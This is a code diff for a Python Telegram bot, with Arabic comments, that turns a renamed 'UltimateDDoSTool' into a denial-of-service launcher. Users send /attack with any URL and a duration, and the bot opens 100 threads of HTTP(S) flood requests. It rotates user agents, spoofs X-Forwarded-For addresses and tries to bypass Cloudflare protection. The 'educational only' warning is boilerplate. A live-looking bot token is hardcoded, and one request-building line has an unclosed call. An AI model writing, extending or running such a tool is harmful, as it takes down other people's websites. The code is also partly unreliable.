@@ -7,145 +7,129 @@ from urllib.parse import urlparse
 import hashlib
 import telebot
 from telebot import types
+import requests
+from fake_useragent import UserAgent
+import cloudscraper
+import re
 
-# تهيئة بوت التيليجرام
-TOKEN = '7333263562:AAE7SGKtGMwlbkxNroPyh3MBvY8EUc2PCmU'
-bot = telebot.TeleBot(TOKEN)
+bot = telebot.TeleBot("7333263562:AAE7SGKtGMwlbkxNroPyh3MBvY8EUc2PCmU")
 
-class AdvancedChallengeTool:
+class UltimateDDoSTool:
     def __init__(self):
-        self.stop_event = threading.Event()
-        self.user_agents = self._generate_realistic_useragents()
-        self.tls_fingerprints = self._generate_tls_fingerprints()
         self.active_attacks = {}
+        self.ua = UserAgent()
+        self.scraper = cloudscraper.create_scraper()
         self.legal_warning = """
-        ⚠️ تحذير: هذا الكود للأغراض التعليمية والبحثية فقط
+        ⚠️ تحذير: هذا الكود للأغراض التعليمية فقط
         ⚠️ استخدامه ضد أنظمة دون إذن غير قانوني
-        ⚠️ يمكنك استخدامه فقط لاختبار أنظمتك الخاصة
         """
 
-    def _generate_realistic_useragents(self):
-        """إنشاء عوامل مستخدم واقعية"""
-        versions = {
-            'chrome': [f'Chrome/{random.randint(100,115)}.0.{random.randint(1000,9999)}.{random.randint(1,100)}' 
-                      for _ in range(20)],
-            'firefox': [f'Firefox/{random.randint(100,115)}.0' for _ in range(20)],
-            'safari': [f'Version/{random.randint(15,17)}.{random.randint(0,5)}' 
-                      for _ in range(20)]
-        }
-        
-        return [
-            f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) {random.choice(versions['chrome'])} Safari/537.36",
-            f"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) {random.choice(versions['safari'])}",
-            f"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 {random.choice(versions['firefox'])}"
-        ]
+    def _normalize_url(self, url):
+        """تنسيق الروابط بشكل صحيح"""
+        if not re.match(r'^https?://', url):
+            url = 'https://' + url
+        parsed = urlparse(url)
+        return f"{parsed.scheme}://{parsed.netloc}"
 
-    def _generate_tls_fingerprints(self):
-        """إنشاء بصمات TLS لمحاكاة متصفحات حقيقية"""
-        return [
-            {
-                'ciphers': [
-                    'TLS_AES_128_GCM_SHA256',
-                    'TLS_CHACHA20_POLY1305_SHA256',
-                    'TLS_AES_256_GCM_SHA384',
-                    'ECDHE-ECDSA-AES128-GCM-SHA256'
-                ],
-                'extensions': [
-                    'server_name',
-                    'extended_master_secret',
-                    'renegotiation_info',
-                    'supported_groups',
-                    'ec_point_formats',
-                    'session_ticket'
-                ]
-            }
-        ]
-
-    def _create_stealth_tls_connection(self, target, port=443):
-        """إنشاء اتصال TLS متخفي"""
+    def _bypass_protection(self, url):
+        """تجاوز حماية Cloudflare وغيرها"""
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(10)
-            sock.connect((target, port))
-            
-            context = ssl.SSLContext(ssl.PROTOCOL_TLS)
-            context.set_ciphers(':'.join(random.choice(self.tls_fingerprints)['ciphers']))
-            context.options |= ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3
-            context.verify_mode = ssl.CERT_NONE
-            
-            tls_sock = context.wrap_socket(sock, server_hostname=target)
-            return tls_sock
-        except Exception as e:
-            return None
-
-    def _send_http_request(self, sock, target, path="/"):
-        """إرسال طلب HTTP مع رؤوس مخصصة"""
-        try:
-            headers = {
-                'User-Agent': random.choice(self.user_agents),
-                'Accept': 'text/html,application/xhtml+xml',
-                'Accept-Language': 'en-US,en;q=0.9',
-                'Accept-Encoding': 'gzip, deflate, br',
-                'Connection': 'keep-alive',
-                'Upgrade-Insecure-Requests': '1',
-                'Sec-Fetch-Dest': 'document',
-                'Sec-Fetch-Mode': 'navigate',
-                'Sec-Fetch-Site': 'none',
-                'Sec-Fetch-User': '?1',
-                'Cache-Control': 'max-age=0',
-                'TE': 'trailers'
-            }
-            
-            request = f"GET {path} HTTP/1.1\r\nHost: {target}\r\n"
-            request += "\r\n".join(f"{k}: {v}" for k, v in headers.items())
-            request += "\r\n\r\n"
-            
-            sock.send(request.encode())
-            response = sock.recv(4096).decode(errors='ignore')
-            return response
+            resp = self.scraper.get(url, timeout=10)
+            return resp.status_code == 200
         except:
-            return None
-
-    def start_attack(self, chat_id, target, duration=60):
-        """بدء هجوم على هدف معين"""
-        if chat_id in self.active_attacks:
             return False
 
-        parsed = urlparse(target)
-        if not parsed.netloc:
-            return False
-
-        host = parsed.netloc
-        self.active_attacks[chat_id] = {
-            'target': host,
-            'stop_event': threading.Event(),
-            'threads': []
+    def _generate_headers(self):
+        """إنشاء رؤوس HTTP متغيرة"""
+        return {
+            'User-Agent': self.ua.random,
+            'Accept': 'text/html,application/xhtml+xml',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Connection': 'keep-alive',
+            'Referer': 'https://www.google.com/',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'cross-site',
+            'TE': 'trailers'
         }
 
-        def worker(stop_event):
-            end_time = time.time() + duration
-            while time.time() < end_time and not stop_event.is_set():
-                try:
-                    sock = self._create_stealth_tls_connection(host)
-                    if sock:
-                        path = f"/{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}"
-                        self._send_http_request(sock, host, path)
-                        sock.close()
-                    time.sleep(random.uniform(0.5, 2.0))
-                except:
-                    pass
+    def _advanced_attack(self, target, duration):
+        """تقنية الهجوم المتقدمة"""
+        parsed = urlparse(target)
+        host = parsed.netloc
+        port = 443 if parsed.scheme == 'https' else 80
+        stop_event = threading.Event()
 
-        # بدء 30 خيطًا للهجوم
-        for _ in range(30):
-            t = threading.Thread(target=worker, args=(self.active_attacks[chat_id]['stop_event'],))
+        def worker():
+            ctx = ssl.create_default_context()
+            ctx.set_ciphers('ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384')
+            while not stop_event.is_set():
+                try:
+                    with socket.create_connection((host, port), timeout=5) as sock:
+                        if parsed.scheme == 'https':
+                            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
+                                self._send_advanced_request(ssock, host)
+                        else:
+                            self._send_advanced_request(sock, host)
+                    time.sleep(random.uniform(0.1, 1.5))
+                except:
+                    continue
+
+        threads = []
+        for _ in range(100):  # 100 خيط هجومي
+            t = threading.Thread(target=worker)
             t.daemon = True
             t.start()
-            self.active_attacks[chat_id]['threads'].append(t)
+            threads.append(t)
 
-        return True
+        return stop_event, threads
+
+    def _send_advanced_request(self, sock, host):
+        """إرسال طلب متطور"""
+        path = f"/{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}"
+        headers = self._generate_headers()
+        
+        # بناء طلب HTTP متطور
+        request = f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
+        request += "\r\n".join(f"{k}: {v}" for k, v in headers.items())
+        request += "\r\nX-Forwarded-For: {}.{}.{}.{}\r\n\r\n".format(
+            random.randint(1, 255), random.randint(0, 255),
+            random.randint(0, 255), random.randint(0, 255)
+        
+        sock.send(request.encode())
+        sock.recv(1024)  # قراءة جزئية للاستجابة
+
+    def start_attack(self, chat_id, url, duration):
+        """بدء هجوم شامل"""
+        try:
+            url = self._normalize_url(url)
+            
+            if not self._bypass_protection(url):
+                return False, "فشل في تجاوز حماية الموقع"
+            
+            stop_event, threads = self._advanced_attack(url, duration)
+            self.active_attacks[chat_id] = {
+                'stop_event': stop_event,
+                'threads': threads,
+                'target': url,
+                'start_time': time.time(),
+                'duration': duration
+            }
+            
+            # خيط لإنهاء الهجوم بعد المدة المحددة
+            def timer():
+                time.sleep(duration)
+                self.stop_attack(chat_id)
+            
+            threading.Thread(target=timer).start()
+            
+            return True, f"بدأ الهجوم على {url} لمدة {duration} ثانية"
+        except Exception as e:
+            return False, f"خطأ: {str(e)}"
 
     def stop_attack(self, chat_id):
-        """إيقاف الهجوم الحالي"""
+        """إيقاف الهجوم"""
         if chat_id in self.active_attacks:
             self.active_attacks[chat_id]['stop_event'].set()
             for t in self.active_attacks[chat_id]['threads']:
@@ -154,39 +138,56 @@ class AdvancedChallengeTool:
             return True
         return False
 
-# إنشاء مثيل من الأداة
-tool = AdvancedChallengeTool()
+# إنشاء أداة الهجوم
+tool = UltimateDDoSTool()
 
-# أوامر التيليجرام
+# أوامر البوت
 @bot.message_handler(commands=['start', 'help'])
 def send_welcome(message):
-    bot.reply_to(message, tool.legal_warning + "\n\nالأوامر المتاحة:\n/attack [URL] [الوقت بالثواني] - بدء الهجوم\n/stop - إيقاف الهجوم")
+    bot.reply_to(message, tool.legal_warning + """
+    🚀 أوامر البوت:
+    /attack [رابط] [الوقت بالثواني] - بدء هجوم شامل
+    /stop - إيقاف الهجوم الحالي
+    /status - حالة الهجوم الحالي
+    """)
 
 @bot.message_handler(commands=['attack'])
-def start_attack(message):
+def attack_cmd(message):
     try:
         args = message.text.split()
         if len(args) < 2:
-            bot.reply_to(message, "استخدم: /attack [URL] [الوقت بالثواني]")
+            bot.reply_to(message, "استخدم: /attack [رابط] [الوقت بالثواني]")
             return
-
+        
         url = args[1]
         duration = int(args[2]) if len(args) > 2 else 60
-
-        if tool.start_attack(message.chat.id, url, duration):
-            bot.reply_to(message, f"✅ بدء الهجوم على {url} لمدة {duration} ثانية")
-        else:
-            bot.reply_to(message, "❌ فشل بدء الهجوم، تأكد من صحة الرابط")
+        
+        success, msg = tool.start_attack(message.chat.id, url, duration)
+        bot.reply_to(message, msg)
     except Exception as e:
         bot.reply_to(message, f"❌ خطأ: {str(e)}")
 
 @bot.message_handler(commands=['stop'])
-def stop_attack(message):
+def stop_cmd(message):
     if tool.stop_attack(message.chat.id):
         bot.reply_to(message, "✅ تم إيقاف الهجوم بنجاح")
     else:
-        bot.reply_to(message, "❌ لا يوجد هجوم نشط لإيقافه")
+        bot.reply_to(message, "⚠️ لا يوجد هجوم نشط لإيقافه")
 
-# بدء البوت
-print("Bot is running...")
+@bot.message_handler(commands=['status'])
+def status_cmd(message):
+    if message.chat.id in tool.active_attacks:
+        attack = tool.active_attacks[message.chat.id]
+        elapsed = int(time.time() - attack['start_time'])
+        remaining = max(0, attack['duration'] - elapsed)
+        bot.reply_to(message, f"""
+        🎯 حالة الهجوم:
+        الهدف: {attack['target']}
+        الوقت المنقضي: {elapsed} ثانية
+        الوقت المتبقي: {remaining} ثانية
+        """)
+    else:
+        bot.reply_to(message, "⚠️ لا يوجد هجوم نشط")
+
+print("✅ البوت يعمل...")
 bot.polling()
